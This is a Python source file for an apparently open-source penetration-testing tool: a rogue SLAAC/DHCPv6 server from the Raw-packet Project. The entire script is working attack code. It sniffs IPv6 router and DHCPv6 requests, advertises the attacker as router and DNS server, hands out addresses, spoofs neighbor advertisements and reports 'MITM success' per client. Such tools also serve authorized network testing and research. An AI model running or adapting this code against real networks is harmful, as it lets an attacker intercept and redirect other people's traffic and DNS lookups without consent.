#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
dhcpv6_rogue_server.py: Rogue SLAAC/DHCPv6 server
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import

# region Add project root path
from sys import path
from os.path import dirname, abspath
path.append(dirname(dirname(dirname(abspath(__file__)))))
# endregion

# region Raw-packet modules
from raw_packet.Utils.base import Base
from raw_packet.Utils.network import Ethernet_raw, IPv6_raw, ICMPv6_raw, UDP_raw, DHCPv6_raw
from raw_packet.Utils.tm import ThreadManager
# endregion

# region Import libraries
from sys import exit
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW, htons
from random import randint
from time import sleep
from os import errno
import subprocess as sub
# endregion

# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.0.4'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Development'
# endregion

# region Check user, platform and create threads
Base = Base()
Base.check_user()
Base.check_platform()
tm = ThreadManager(5)
# endregion

# region Parse script arguments
parser = ArgumentParser(description='Rogue SLAAC/DHCPv6 server')

parser.add_argument('-i', '--interface', help='Set interface name for send reply packets')
parser.add_argument('-p', '--prefix', type=str, help='Set network prefix', default='fd00::/64')

parser.add_argument('-f', '--first_suffix', type=int, help='Set first suffix client IPv6 for offering', default=2)
parser.add_argument('-l', '--last_suffix', type=int, help='Set last suffix client IPv6 for offering', default=255)

parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address', default=None)
parser.add_argument('-T', '--target_ipv6', type=str, help='Set client Global IPv6 address with MAC in --target_mac',
                    default=None)

parser.add_argument('-D', '--disable_dhcpv6', action='store_true', help='Do not use DHCPv6 protocol')
parser.add_argument('-d', '--dns', type=str, help='Set recursive DNS IPv6 address', default=None)
parser.add_argument('-s', '--dns_search', type=str, help='Set DNS search list', default="local")
parser.add_argument('--delay', type=int, help='Set delay between packets', default=1)
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
args = parser.parse_args()
# endregion

# region Print banner if argument quit is not set
if not args.quiet:
    Base.print_banner()
# endregion

# region Set global variables
eth = Ethernet_raw()
ipv6 = IPv6_raw()
icmpv6 = ICMPv6_raw()
udp = UDP_raw()
dhcpv6 = DHCPv6_raw()

recursive_dns_address = None

target_mac_address = None
target_ipv6_address = None

first_suffix = None
last_suffix = None

clients = {}

icmpv6_router_solicitation_address = "33:33:00:00:00:02"
dhcpv6_requests_address = "33:33:00:01:00:02"
# endregion

# region Disable or Enable DHCPv6 protocol
disable_dhcpv6 = False
if args.disable_dhcpv6:
    disable_dhcpv6 = True
# endregion

# region Get your network settings
if args.interface is None:
    Base.print_warning("Please set a network interface for sniffing ICMPv6 and DHCPv6 requests ...")
current_network_interface = Base.netiface_selection(args.interface)

your_mac_address = Base.get_netiface_mac_address(current_network_interface)
if your_mac_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have MAC address!"
    exit(1)

your_local_ipv6_address = Base.get_netiface_ipv6_link_address(current_network_interface)
if your_local_ipv6_address is None:
    print Base.c_error + "Network interface: " + current_network_interface + " do not have IPv6 link local address!"
    exit(1)
# endregion

# region Create raw socket
global_socket = socket(AF_PACKET, SOCK_RAW)
global_socket.bind((current_network_interface, 0))
# endregion

# region Set search domain and Network prefix
dns_search = args.dns_search
network_prefix = args.prefix

network_prefix_address = network_prefix.split('/')[0]
network_prefix_length = network_prefix.split('/')[1]
# endregion

# region Set target MAC and IPv6 address, if target IP is not set - get first and last suffix IPv6 address

# region Set target IPv6 address
if args.target_mac is not None:
    target_mac_address = str(args.target_mac).lower()
# endregion

# region Target IPv6 is set
if args.target_ipv6 is not None:
    if args.target_mac is not None:
        if not Base.ipv6_address_validation(args.target_ipv6):
            Base.print_error("Bad target IPv6 address in `-T, --target_ipv6` parameter: ", args.target_ipv6)
            exit(1)
        else:
            target_ipv6_address = args.target_ipv6
            clients[target_mac_address] = {'advertise address': target_ipv6_address}
    else:
        Base.print_error("Please set target MAC address (example: --target_mac 00:AA:BB:CC:DD:FF)" +
                         ", for target IPv6 address: ", args.target_ipv6)
        exit(1)
# endregion

# region Target IPv6 is not set - get first and last suffix IPv6 address
else:
    # Check first suffix IPv6 address
    if 1 < args.first_suffix < 65535:
        first_suffix = args.first_suffix
    else:
        Base.print_error("Bad value `-f, --first_suffix`: ", args.first_suffix,
                         "; first suffix IPv6 address must be in range: ", "1 - 65535")
        exit(1)

    # Check last suffix IPv6 address
    if args.last_suffix > first_suffix:
        if 1 < args.last_suffix < 65535:
            last_suffix = args.last_suffix
        else:
            Base.print_error("Bad value `-l, --last_suffix`: ", args.first_suffix,
                             "; last suffix IPv6 address must be in range: ", "1 - 65535")
            exit(1)
    else:
        Base.print_error("Bad value `-l, --last_suffix`: ", args.first_suffix,
                         "; last suffix IPv6 address should be more first suffix IPv6 address: ", str(first_suffix))
        exit(1)

# endregion

# endregion

# region Set recursive DNS server address
if args.dns is None:
    recursive_dns_address = your_local_ipv6_address
else:
    if Base.ipv6_address_validation(args.dns):
        recursive_dns_address = args.dns
    else:
        Base.print_error("Bad DNS server IPv6 address in `--dns` parameter: ", args.dns)
        exit(1)
# endregion

# region General output
if not args.quiet:
    Base.print_info("Network interface: ", current_network_interface)
    Base.print_info("Your MAC address: ", your_mac_address)
    Base.print_info("Your link local IPv6 address: ", your_local_ipv6_address)

    if target_mac_address is not None:
        Base.print_info("Target MAC: ", target_mac_address)
    if target_ipv6_address is not None:
        Base.print_info("Target Global IPv6: ", target_ipv6_address)
    else:
        Base.print_info("First suffix offer IP: ", str(first_suffix))
        Base.print_info("Last suffix offer IP: ", str(last_suffix))

    Base.print_info("Prefix: ", network_prefix)
    Base.print_info("Router IPv6 address: ", your_local_ipv6_address)
    Base.print_info("DNS IPv6 address: ", recursive_dns_address)
    Base.print_info("Domain search: ", dns_search)
# endregion


# region Add client info in global clients dictionary
def add_client_info_in_dictionary(client_mac_address, client_info, this_client_already_in_dictionary=False):
    if this_client_already_in_dictionary:
        clients[client_mac_address].update(client_info)
    else:
        clients[client_mac_address] = client_info
# endregion


# region Send ICMPv6 solicit packets
def send_icmpv6_solicit_packets():
    icmpv6_solicit_raw_socket = socket(AF_PACKET, SOCK_RAW)
    icmpv6_solicit_raw_socket.bind((current_network_interface, 0))

    try:
        while True:
            icmpv6_solicit_packet = icmpv6.make_router_solicit_packet(ethernet_src_mac=your_mac_address,
                                                                      ipv6_src=your_local_ipv6_address,
                                                                      need_source_link_layer_address=True,
                                                                      source_link_layer_address=eth.get_random_mac())
            icmpv6_solicit_raw_socket.send(icmpv6_solicit_packet)
            sleep(int(args.delay))

    except KeyboardInterrupt:
        Base.print_info("Exit")
        icmpv6_solicit_raw_socket.close()
        exit(0)
# endregion


# region Send DHCPv6 solicit packets
def send_dhcpv6_solicit_packets():
    dhcpv6_solicit_raw_socket = socket(AF_PACKET, SOCK_RAW)
    dhcpv6_solicit_raw_socket.bind((current_network_interface, 0))

    try:
        while True:
            Client_DUID = dhcpv6.get_duid(eth.get_random_mac())
            request_options = [23, 24]

            dhcpv6_solicit_packet = dhcpv6.make_solicit_packet(ethernet_src_mac=your_mac_address,
                                                               ipv6_src=your_local_ipv6_address,
                                                               transaction_id=randint(1, 16777215),
                                                               client_identifier=Client_DUID,
                                                               option_request_list=request_options)
            dhcpv6_solicit_raw_socket.send(dhcpv6_solicit_packet)
            sleep(int(args.delay))

    except KeyboardInterrupt:
        Base.print_info("Exit")
        dhcpv6_solicit_raw_socket.close()
        exit(0)
# endregion


# region Send ICMPv6 advertise packets
def send_icmpv6_advertise_packets():
    icmpv6_advertise_raw_socket = socket(AF_PACKET, SOCK_RAW)
    icmpv6_advertise_raw_socket.bind((current_network_interface, 0))

    icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                               ethernet_dst_mac="33:33:00:00:00:01",
                                                               ipv6_src=your_local_ipv6_address,
                                                               ipv6_dst="ff02::1",
                                                               dns_address=recursive_dns_address,
                                                               domain_search=dns_search,
                                                               prefix=network_prefix,
                                                               router_lifetime=5000,
                                                               advertisement_interval=int(args.delay) * 1000)
    try:
        while True:
            icmpv6_advertise_raw_socket.send(icmpv6_ra_packet)
            sleep(int(args.delay))

    except KeyboardInterrupt:
        Base.print_info("Exit")
        icmpv6_advertise_raw_socket.close()
        exit(0)


# endregion


# region Reply to DHCPv6 and ICMPv6 requests
def reply(request):

    # region Define global variables
    global global_socket
    global disable_dhcpv6
    global clients
    global target_ipv6_address
    global first_suffix
    global last_suffix
    # endregion

    # region Get client MAC address
    client_mac_address = request['Ethernet']['source']
    # endregion

    # region Check this client already in global clients dictionary
    client_already_in_dictionary = False
    if client_mac_address in clients.keys():
        client_already_in_dictionary = True
    # endregion

    # region ICMPv6
    if 'ICMPv6' in request.keys():

        # region ICMPv6 Router Solicitation
        if request['ICMPv6']['type'] == 133:

            # Make and send ICMPv6 router advertisement packet
            icmpv6_ra_packet = icmpv6.make_router_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                       ethernet_dst_mac=request['Ethernet']['source'],
                                                                       ipv6_src=your_local_ipv6_address,
                                                                       ipv6_dst=request['IPv6']['source-ip'],
                                                                       dns_address=recursive_dns_address,
                                                                       domain_search=dns_search,
                                                                       prefix=network_prefix,
                                                                       router_lifetime=5000)
            global_socket.send(icmpv6_ra_packet)

            # Print info messages
            Base.print_info("ICMPv6 Router Solicitation request from: ", request['IPv6']['source-ip'] +
                            " (" + request['Ethernet']['source'] + ")")
            Base.print_info("ICMPv6 Router Advertisement reply to: ", request['IPv6']['source-ip'] +
                            " (" + request['Ethernet']['source'] + ")")

            # Delete this client from global clients dictionary
            try:
                del clients[client_mac_address]
                client_already_in_dictionary = False
            except KeyError:
                pass

            # Add client info in global clients dictionary
            add_client_info_in_dictionary(client_mac_address,
                                          {"router solicitation": True,
                                           "network prefix": network_prefix},
                                          client_already_in_dictionary)

        # endregion

        # region ICMPv6 Neighbor Solicitation
        if request['ICMPv6']['type'] == 135:

            # region Get ICMPv6 Neighbor Solicitation target address
            target_address = request['ICMPv6']['target-address']
            # endregion

            # region Network prefix in ICMPv6 Neighbor Solicitation target address is bad
            if not target_address.startswith('fe80::'):
                if not target_address.startswith(network_prefix_address):
                    na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                          ipv6_src=your_local_ipv6_address,
                                                                          target_ipv6_address=target_address)
                    for _ in range(5):
                        global_socket.send(na_packet)
            # endregion

            # region ICMPv6 Neighbor Solicitation target address is your local IPv6 address
            if target_address == your_local_ipv6_address:

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(client_mac_address,
                                              {"neighbor solicitation your address": True},
                                              client_already_in_dictionary)
            # endregion

            # region DHCPv6 advertise address is set

            # This client already in dictionary
            if client_already_in_dictionary:

                # Advertise address for this client is set
                if 'advertise address' in clients[client_mac_address].keys():

                    # ICMPv6 Neighbor Solicitation target address is DHCPv6 advertise IPv6 address
                    if target_address == clients[client_mac_address]['advertise address']:

                        # Add client info in global clients dictionary
                        add_client_info_in_dictionary(client_mac_address,
                                                      {"neighbor solicitation advertise address": True},
                                                      client_already_in_dictionary)

                    # ICMPv6 Neighbor Solicitation target address is not DHCPv6 advertise IPv6 address
                    else:
                        if not target_address.startswith('fe80::'):
                            na_packet = icmpv6.make_neighbor_advertisement_packet(ethernet_src_mac=your_mac_address,
                                                                                  ipv6_src=your_local_ipv6_address,
                                                                                  target_ipv6_address=target_address)
                            for _ in range(5):
                                global_socket.send(na_packet)

            # endregion

            # region Print MITM Success message
            if not disable_dhcpv6:
                try:
                    if clients[client_mac_address]['dhcpv6 mitm'] == 'success':
                        test = clients[client_mac_address]['neighbor solicitation your address']

                        try:
                            test = clients[client_mac_address]['success message']
                        except KeyError:
                            Base.print_success("MITM success: ",
                                               clients[client_mac_address]['advertise address'] +
                                               " (" + client_mac_address + ")")
                            clients[client_mac_address].update({"success message": True})
                except KeyError:
                    pass
            # endregion

        # endregion

    # endregion

    # region DHCPv6

    # Protocol DHCPv6 is enabled
    if not disable_dhcpv6:

        if 'DHCPv6' in request.keys():

            # region DHCPv6 Solicit
            if request['DHCPv6']['message-type'] == 1:

                # Get Client DUID time from Client Identifier DUID
                client_duid_time = 0
                for dhcpv6_option in request['DHCPv6']['options']:
                    if dhcpv6_option['type'] == 1:
                        client_duid_time = dhcpv6_option['value']['duid-time']

                # Set IPv6 address in advertise packet
                if target_ipv6_address is not None:
                    ipv6_address = target_ipv6_address
                else:
                    ipv6_address = network_prefix.split('/')[0] + str(randint(first_suffix, last_suffix))

                # Make and send DHCPv6 advertise packet
                dhcpv6_advertise = dhcpv6.make_advertise_packet(ethernet_src_mac=your_mac_address,
                                                                ethernet_dst_mac=request['Ethernet']['source'],
                                                                ipv6_src=your_local_ipv6_address,
                                                                ipv6_dst=request['IPv6']['source-ip'],
                                                                transaction_id=request['DHCPv6']['transaction-id'],
                                                                dns_address=recursive_dns_address,
                                                                domain_search=dns_search,
                                                                ipv6_address=ipv6_address,
                                                                client_duid_timeval=client_duid_time)
                global_socket.send(dhcpv6_advertise)

                # Print info messages
                Base.print_info("DHCPv6 Solicit from: ", request['IPv6']['source-ip'] +
                                " (" + request['Ethernet']['source'] + ")",
                                " XID: ", hex(request['DHCPv6']['transaction-id']))
                Base.print_info("DHCPv6 Advertise to: ", request['IPv6']['source-ip'] +
                                " (" + request['Ethernet']['source'] + ")",
                                " XID: ", hex(request['DHCPv6']['transaction-id']),
                                " IAA: ", ipv6_address)

                # Add client info in global clients dictionary
                add_client_info_in_dictionary(client_mac_address,
                                              {"dhcpv6 solicit": True,
                                               "advertise address": ipv6_address},
                                              client_already_in_dictionary)

            # endregion

            # region DHCPv6 Request
            if request['DHCPv6']['message-type'] == 3:

                # Set DHCPv6 reply packet
                dhcpv6_reply = None

                # region Get Client DUID time, IPv6 address and Server MAC address
                client_duid_time = 0
                client_ipv6_address = None
                server_mac_address = None

                for dhcpv6_option in request['DHCPv6']['options']:
                    if dhcpv6_option['type'] == 1:
                        client_duid_time = dhcpv6_option['value']['duid-time']
                    if dhcpv6_option['type'] == 2:
                        server_mac_address = dhcpv6_option['value']['mac-address']
                    if dhcpv6_option['type'] == 3:
                        client_ipv6_address = dhcpv6_option['value']['ipv6-address']
                # endregion

                if server_mac_address and client_ipv6_address is not None:

                    # Check Server MAC address
                    if server_mac_address != your_mac_address:
                        add_client_info_in_dictionary(client_mac_address,
                                                      {"dhcpv6 mitm":
                                                       "error: server mac address is not your mac address"},
                                                      client_already_in_dictionary)
                    else:
                        add_client_info_in_dictionary(client_mac_address,
                                                      {"dhcpv6 mitm": "success"},
                                                      client_already_in_dictionary)

                        try:
                            if client_ipv6_address == clients[client_mac_address]['advertise address']:
                                dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
                                                                        ethernet_dst_mac=request['Ethernet']['source'],
                                                                        ipv6_src=your_local_ipv6_address,
                                                                        ipv6_dst=request['IPv6']['source-ip'],
                                                                        transaction_id=request['DHCPv6']
                                                                        ['transaction-id'],
                                                                        dns_address=recursive_dns_address,
                                                                        domain_search=dns_search,
                                                                        ipv6_address=client_ipv6_address,
                                                                        client_duid_timeval=client_duid_time)
                                global_socket.send(dhcpv6_reply)
                            else:
                                add_client_info_in_dictionary(client_mac_address,
                                                              {"dhcpv6 mitm":
                                                               "error: client request address is not advertise address"},
                                                              client_already_in_dictionary)

                        except KeyError:
                            add_client_info_in_dictionary(client_mac_address,
                                                          {"dhcpv6 mitm":
                                                           "error: not found dhcpv6 solicit request for this client"},
                                                          client_already_in_dictionary)

                    # Print info messages
                    Base.print_info("DHCPv6 Request from: ", request['IPv6']['source-ip'] +
                                    " (" + request['Ethernet']['source'] + ")",
                                    " XID: ", hex(request['DHCPv6']['transaction-id']),
                                    " Server: ", server_mac_address,
                                    " IAA: ", client_ipv6_address)

                    if dhcpv6_reply is not None:
                        Base.print_info("DHCPv6 Reply to:     ", request['IPv6']['source-ip'] +
                                        " (" + request['Ethernet']['source'] + ")",
                                        " XID: ", hex(request['DHCPv6']['transaction-id']),
                                        " Server: ", server_mac_address,
                                        " IAA: ", client_ipv6_address)
                    else:
                        if clients[client_mac_address]["dhcpv6 mitm"] == \
                                "error: server mac address is not your mac address":
                            Base.print_error("Server MAC address in DHCPv6 Request is not your MAC address " +
                                             "for this client: ", client_mac_address)

                        if clients[client_mac_address]["dhcpv6 mitm"] == \
                                "error: client request address is not advertise address":
                            Base.print_error("Client requested IPv6 address is not advertise IPv6 address " +
                                             "for this client: ", client_mac_address)

                        if clients[client_mac_address]["dhcpv6 mitm"] == \
                                "error: not found dhcpv6 solicit request for this client":
                            Base.print_error("Could not found DHCPv6 solicit request " +
                                             "for this client: ", client_mac_address)

            # endregion

            # region DHCPv6 Release
            if request['DHCPv6']['message-type'] == 8:
                # Print info message
                Base.print_info("DHCPv6 Release from: ", request['IPv6']['source-ip'] +
                                " (" + request['Ethernet']['source'] + ")",
                                " XID: ", hex(request['DHCPv6']['transaction-id']))

                # Delete this client from global clients dictionary
                try:
                    del clients[client_mac_address]
                    client_already_in_dictionary = False
                except KeyError:
                    pass

            # endregion

            # region DHCPv6 Confirm
            if request['DHCPv6']['message-type'] == 4:

                # region Get Client DUID time and client IPv6 address
                client_duid_time = 0
                client_ipv6_address = None

                for dhcpv6_option in request['DHCPv6']['options']:
                    if dhcpv6_option['type'] == 1:
                        client_duid_time = dhcpv6_option['value']['duid-time']
                    if dhcpv6_option['type'] == 3:
                        client_ipv6_address = dhcpv6_option['value']['ipv6-address']
                # endregion

                # region Make and send DHCPv6 Reply packet
                dhcpv6_reply = dhcpv6.make_reply_packet(ethernet_src_mac=your_mac_address,
                                                        ethernet_dst_mac=request['Ethernet']['source'],
                                                        ipv6_src=your_local_ipv6_address,
                                                        ipv6_dst=request['IPv6']['source-ip'],
                                                        transaction_id=request['DHCPv6']['transaction-id'],
                                                        dns_address=recursive_dns_address,
                                                        domain_search=dns_search,
                                                        ipv6_address=client_ipv6_address,
                                                        client_duid_timeval=client_duid_time)
                global_socket.send(dhcpv6_reply)
                # endregion

                # region Add Client info in global clients dictionary and print info message
                add_client_info_in_dictionary(client_mac_address,
                                              {"advertise address": client_ipv6_address,
                                               "dhcpv6 mitm": "success"},
                                              client_already_in_dictionary)

                Base.print_info("DHCPv6 Confirm from: ", request['IPv6']['source-ip'] +
                                " (" + request['Ethernet']['source'] + ")",
                                " XID: ", hex(request['DHCPv6']['transaction-id']),
                                " IAA: ", client_ipv6_address)
                Base.print_info("DHCPv6 Reply to:     ", request['IPv6']['source-ip'] +
                                " (" + request['Ethernet']['source'] + ")",
                                " XID: ", hex(request['DHCPv6']['transaction-id']),
                                " IAA: ", client_ipv6_address)
                # endregion

            # endregion

            # # DHCPv6 Decline
            # if request.haslayer(DHCP6_Decline):
            #     print Base.c_warning + "Sniff DHCPv6 Decline from: " + request[IPv6].src + " (" + \
            #           request[Ether].src + ") TID: " + hex(request[DHCP6_Decline].trid) + \
            #           " IAADDR: " + request[DHCP6OptIAAddress].addr
            #     # print request.summary

    # endregion

# endregion


# region Main function
if __name__ == "__main__":

    # region Send ICMPv6 advertise packets in other thread
    tm.add_task(send_icmpv6_advertise_packets)
    # endregion

    # region Add multicast MAC addresses on interface
    try:
        Base.print_info("Get milticast MAC address on interface: ", current_network_interface)
        mcast_addresses = sub.Popen(['ip maddress show ' + current_network_interface], shell=True, stdout=sub.PIPE)
        out, err = mcast_addresses.communicate()

        if icmpv6_router_solicitation_address not in out:
            icmpv6_mcast_address = sub.Popen(['ip maddress add ' + icmpv6_router_solicitation_address +
                                              ' dev ' + current_network_interface], shell=True, stdout=sub.PIPE)
            out, err = icmpv6_mcast_address.communicate()
            if out == "":
                Base.print_info("Add milticast MAC address: ", icmpv6_router_solicitation_address,
                                " on interface: ", current_network_interface)
            else:
                Base.print_error("Could not add milticast MAC address: ", icmpv6_router_solicitation_address,
                                 " on interface: ", current_network_interface)
                exit(1)

        if dhcpv6_requests_address not in out:
            dhcp6_mcast_address = sub.Popen(['ip maddress add ' + dhcpv6_requests_address +
                                             ' dev ' + current_network_interface], shell=True, stdout=sub.PIPE)
            out, err = dhcp6_mcast_address.communicate()
            if out == "":
                Base.print_info("Add milticast MAC address: ", dhcpv6_requests_address,
                                " on interface: ", current_network_interface)
            else:
                Base.print_error("Could not add milticast MAC address: ", dhcpv6_requests_address,
                                 " on interface: ", current_network_interface)
                exit(1)

    except OSError as e:
        if e.errno == errno.ENOENT:
            Base.print_error("Program: ", "ip", " is not installed!")
            exit(1)
        else:
            Base.print_error("Something went wrong while trying to run ", "`ip`")
            exit(2)
    # endregion

    # region Create RAW socket for sniffing
    raw_socket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
    # endregion

    # region Print info message
    Base.print_info("Waiting for a ICMPv6 or DHCPv6 requests ...")
    # endregion

    # region Start sniffing
    while True:

        # region Try
        try:

            # region Sniff packets from RAW socket
            packets = raw_socket.recvfrom(2048)

            for packet in packets:

                # region Parse Ethernet header
                ethernet_header = packet[:eth.header_length]
                ethernet_header_dict = eth.parse_header(ethernet_header)
                # endregion

                # region Could not parse Ethernet header - break
                if ethernet_header_dict is None:
                    break
                # endregion

                # region Ethernet filter
                if target_mac_address is not None:
                    if ethernet_header_dict['source'] != target_mac_address:
                        break
                else:
                    if ethernet_header_dict['source'] == your_mac_address:
                        break
                # endregion

                # region IPv6 packet

                # 34525 - Type of IP packet (0x86dd)
                if ethernet_header_dict['type'] != ipv6.header_type:
                    break

                # region Parse IPv6 header
                ipv6_header = packet[eth.header_length:eth.header_length + ipv6.header_length]
                ipv6_header_dict = ipv6.parse_header(ipv6_header)
                # endregion

                # region Could not parse IPv6 header - break
                if ipv6_header_dict is None:
                    break
                # endregion

                # region UDP
                if ipv6_header_dict['next-header'] == udp.header_type:

                    # region Parse UDP header
                    udp_header_offset = eth.header_length + ipv6.header_length
                    udp_header = packet[udp_header_offset:udp_header_offset + udp.header_length]
                    udp_header_dict = udp.parse_header(udp_header)
                    # endregion

                    # region Could not parse UDP header - break
                    if udp_header_dict is None:
                        break
                    # endregion

                    # region DHCPv6 packet

                    if udp_header_dict['destination-port'] == 547 and udp_header_dict['source-port'] == 546:

                        # region Parse DHCPv6 request packet
                        dhcpv6_packet_offset = udp_header_offset + udp.header_length
                        dhcpv6_packet = packet[dhcpv6_packet_offset:]
                        dhcpv6_packet_dict = dhcpv6.parse_packet(dhcpv6_packet)
                        # endregion

                        # region Could not parse DHCPv6 request packet - break
                        if dhcpv6_packet_dict is None:
                            break
                        # endregion

                        # region Call function with full DHCPv6 packet
                        reply({
                            "Ethernet": ethernet_header_dict,
                            "IPv6": ipv6_header_dict,
                            "UDP": udp_header_dict,
                            "DHCPv6": dhcpv6_packet_dict
                        })
                        # endregion

                    # endregion

                # endregion

                # region ICMPv6
                if ipv6_header_dict['next-header'] == icmpv6.packet_type:

                    # region Parse ICMPv6 packet
                    icmpv6_packet_offset = eth.header_length + ipv6.header_length
                    icmpv6_packet = packet[icmpv6_packet_offset:]
                    icmpv6_packet_dict = icmpv6.parse_packet(icmpv6_packet)
                    # endregion

                    # region Could not parse ICMPv6 packet - break
                    if icmpv6_packet_dict is None:
                        break
                    # endregion

                    # region ICMPv6 filter
                    if icmpv6_packet_dict['type'] == 133 or 135:
                        pass
                    else:
                        break
                    # endregion

                    # region Call function with full ICMPv6 packet
                    reply({
                        "Ethernet": ethernet_header_dict,
                        "IPv6": ipv6_header_dict,
                        "ICMPv6": icmpv6_packet_dict
                    })
                    # endregion

                # endregion

                # endregion

            # endregion

        # endregion

        # region Exception - KeyboardInterrupt
        except KeyboardInterrupt:
            Base.print_info("Exit")
            exit(0)
        # endregion

    # endregion

# endregion
